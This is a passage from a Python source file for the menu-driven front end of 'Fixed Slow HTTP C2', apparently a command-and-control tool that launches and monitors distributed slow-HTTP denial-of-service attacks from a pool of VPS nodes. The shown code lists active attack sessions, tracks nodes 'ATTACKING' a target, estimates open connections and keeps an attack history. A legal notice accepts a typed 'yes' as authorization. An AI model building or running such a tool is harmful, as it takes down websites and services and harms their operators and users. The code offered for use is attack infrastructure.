                print(f"{Colors.CYAN}[INFO] Session ID: {session_id}{Colors.RESET}")
                
                input(f"\n{Colors.YELLOW}Press Enter to start monitoring...{Colors.RESET}")
                self.monitor_attack(session_id)
            else:
                print(f"{Colors.RED}[ERROR] Failed to launch attack{Colors.RESET}")
                input("Press Enter to continue...")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED]{Colors.RESET}")
            input("Press Enter to continue...")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            input("Press Enter to continue...")
    
    def monitor_attack(self, session_id=None):
        if session_id is None:
            if not self.attack_manager.active_attacks:
                print(f"{Colors.YELLOW}[INFO] No active attacks{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            print(f"\n{Colors.BOLD}ACTIVE ATTACKS:{Colors.RESET}")
            for sid, attack_info in self.attack_manager.active_attacks.items():
                print(f"Session {sid}: {attack_info['target_host']} ({attack_info['attack_type']})")
            
            try:
                session_input = self.input_with_prompt("Enter session ID: ")
                if not session_input or not session_input.isdigit():
                    return
                session_id = int(session_input)
            except (ValueError, KeyboardInterrupt):
                return
        
        if session_id not in self.attack_manager.active_attacks:
            print(f"{Colors.RED}[ERROR] Session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.GREEN}[MONITORING] Starting real-time monitoring...{Colors.RESET}")
        print(f"{Colors.YELLOW}[INFO] Press Ctrl+C to stop{Colors.RESET}")
        time.sleep(2)
        
        try:
            while session_id in self.attack_manager.active_attacks:
                status_data = self.attack_manager.get_attack_status(session_id)
                attack_info = self.attack_manager.active_attacks[session_id]
                
                self.clear_screen()
                
                print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.RED}     FIXED SLOW HTTP ATTACK - MONITORING{Colors.RESET}")
                print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
                
                print(f"\n{Colors.YELLOW}[SESSION] {session_id} - {attack_info['attack_type'].upper()}{Colors.RESET}")
                print(f"{Colors.CYAN}[TARGET]  {attack_info['target_host']}{Colors.RESET}")
                
                if attack_info.get('start_time'):
                    uptime = datetime.now() - attack_info['start_time']
                    print(f"{Colors.GREEN}[UPTIME]  {str(uptime).split('.')[0]}{Colors.RESET}")
                
                print(f"\n{Colors.BOLD}VPS STATUS:{Colors.RESET}")
                print(f"{'IP Address':<15} {'Status':<12} {'Processes':<10}")
                print("-" * 50)
                
                total_processes = 0
                active_vps = 0
                
                for vps_ip, data in status_data.items():
                    processes = data.get('active_processes', 0)
                    status = "ATTACKING" if processes > 0 else "IDLE"
                    color = Colors.GREEN if processes > 0 else Colors.RED
                    
                    total_processes += processes
                    if processes > 0:
                        active_vps += 1
                    
                    print(f"{vps_ip:<15} {color}{status:<12}{Colors.RESET} {processes:<10}")
                
                print(f"\n{Colors.BOLD}STATISTICS:{Colors.RESET}")
                print(f"{Colors.YELLOW}Active VPS: {active_vps}/{len(status_data)}{Colors.RESET}")
                print(f"{Colors.YELLOW}Total Processes: {total_processes}{Colors.RESET}")
                
                params = attack_info.get('parameters', {})
                est_connections = total_processes * params.get('connections', 100)
                print(f"{Colors.RED}Est. Connections: {est_connections:,}{Colors.RESET}")
                
                print(f"\n{Colors.PURPLE}Press Ctrl+C to stop monitoring{Colors.RESET}")
                
                time.sleep(5)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[INFO] Monitoring stopped{Colors.RESET}")
            
            try:
                stop_attack = input(f"{Colors.RED}Stop attack? (y/N): {Colors.RESET}").strip().lower()
                if stop_attack == 'y':
                    self.attack_manager.stop_attack(session_id)
            except KeyboardInterrupt:
                pass
        
        input("\nPress Enter to continue...")
    
    def attack_history_menu(self):
        self.clear_screen()
        self.print_banner()
        
        sessions = self.db_manager.get_attack_sessions()
        
        print(f"{Colors.BOLD}ATTACK HISTORY{Colors.RESET}")
        print("=" * 20)
        
        if not sessions:
            print(f"\n{Colors.YELLOW}No attack history{Colors.RESET}")
        else:
            print(f"\n{'ID':<4} {'Name':<20} {'Target':<15} {'Type':<10} {'Status':<10}")
            print("-" * 70)
            
            for session in sessions:
                status_color = Colors.GREEN if session[8] == 'completed' else Colors.YELLOW
                print(f"{session[0]:<4} {session[1][:19]:<20} {session[3][:14]:<15} {session[4]:<10} {status_color}{session[8]:<10}{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def system_status_menu(self):
        self.clear_screen()
        self.print_banner()
        
        print(f"{Colors.BOLD}SYSTEM STATUS{Colors.RESET}")
        print("=" * 15)
        
        vps_list = self.db_manager.get_all_vps()
        online_count = sum(1 for vps in vps_list if vps[5] == 'online')
        
        print(f"\n{Colors.BOLD}VPS NODES:{Colors.RESET}")
        print(f"Total: {Colors.CYAN}{len(vps_list)}{Colors.RESET}")
        print(f"Online: {Colors.GREEN}{online_count}{Colors.RESET}")
        print(f"Offline: {Colors.RED}{len(vps_list) - online_count}{Colors.RESET}")
        
        sessions = self.db_manager.get_attack_sessions()
        active_attacks = len(self.attack_manager.active_attacks)
        
        print(f"\n{Colors.BOLD}ATTACKS:{Colors.RESET}")
        print(f"Total Sessions: {Colors.CYAN}{len(sessions)}{Colors.RESET}")
        print(f"Active Attacks: {Colors.RED}{active_attacks}{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}SYSTEM:{Colors.RESET}")
        print(f"Database: {Colors.CYAN}{os.path.exists(self.db_manager.db_file)}{Colors.RESET}")
        print(f"Version: {Colors.GREEN}Fixed Edition v1.0{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def run(self):
        while self.running:
            try:
                self.clear_screen()
                self.print_banner()
                self.print_menu()
                
                choice = input().strip()
                
                if choice == '1':
                    self.vps_management_menu()
                elif choice == '2':
                    self.launch_attack_menu()
                elif choice == '3':
                    self.monitor_attack()
                elif choice == '4':
                    self.attack_history_menu()
                elif choice == '5':
                    self.system_status_menu()
                elif choice == '0':
                    print(f"{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
                    break
                else:
                    print(f"{Colors.RED}Invalid option{Colors.RESET}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
                input("Press Enter to continue...")

def main():
    if sys.version_info < (3, 6):
        print("Python 3.6+ required")
        sys.exit(1)
    
    try:
        import paramiko
        from cryptography.fernet import Fernet
        import colorama
    except ImportError as e:
        print(f"Missing dependency: {e}")
        print("Install: pip install paramiko cryptography colorama")
        sys.exit(1)
    
    os.makedirs('logs', exist_ok=True)
    
    print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                           LEGAL NOTICE                           ║
║                                                                   ║
║ This tool is for EDUCATIONAL and AUTHORIZED testing ONLY         ║
║ Unauthorized use is ILLEGAL and may result in prosecution        ║
║                                                                   ║
║ By proceeding, you acknowledge proper authorization               ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")
    
    confirm = input(f"{Colors.YELLOW}Do you have proper authorization? (yes/no): {Colors.RESET}").strip().lower()
    if confirm != 'yes':
        print(f"{Colors.RED}Authorization required. Exiting.{Colors.RESET}")
        sys.exit(0)
    
    try:
        print("Starting Fixed Slow HTTP C2...")
        tui = SlowHTTPTUI()
        tui.run()
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
